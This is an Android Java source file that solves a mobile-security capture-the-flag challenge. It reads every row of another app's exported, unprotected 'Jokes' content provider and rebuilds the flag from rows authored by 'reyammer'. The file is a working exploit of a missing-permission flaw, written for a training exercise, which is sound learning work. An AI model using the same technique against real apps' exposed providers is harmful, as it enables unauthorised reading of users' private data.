package org.naija.jokes;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

/**
 * Challenge 04: Jokes Content Provider.
 *
 * Exploit: com.mobisec.provider.Joke/jokes is an exported ContentProvider
 * with no read-permission requirement, so any app can query it directly.
 * No filtering is applied server-side either - we pull every row back and
 * do the "author == reyammer" filter ourselves, then concatenate the
 * "joke" column of matching rows in cursor order to reconstruct the flag.
 */
public class MainActivity extends Activity {
    private static final String TAG = "MOBISEC";
    private static final Uri URI = Uri.parse("content://com.mobisec.provider.Joke/jokes");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        StringBuilder flag = new StringBuilder();
        Cursor c = null;
        try {
            c = getContentResolver().query(URI, null, null, null, null);
            if (c == null) {
                Log.e(TAG, "query returned null (provider not found?)");
            } else {
                int author = c.getColumnIndexOrThrow("author");
                int joke = c.getColumnIndexOrThrow("joke");
                while (c.moveToNext()) {
                    String a = c.getString(author);
                    Log.e(TAG, "row: " + a + " -> " + c.getString(joke));
                    if ("reyammer".equals(a)) {
                        flag.append(c.getString(joke));
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "query failed", e);
        } finally {
            if (c != null) c.close();
        }

        Log.e(TAG, "FLAG: " + flag);
        TextView tv = new TextView(this);
        tv.setText(flag.toString());
        setContentView(tv);
    }
}
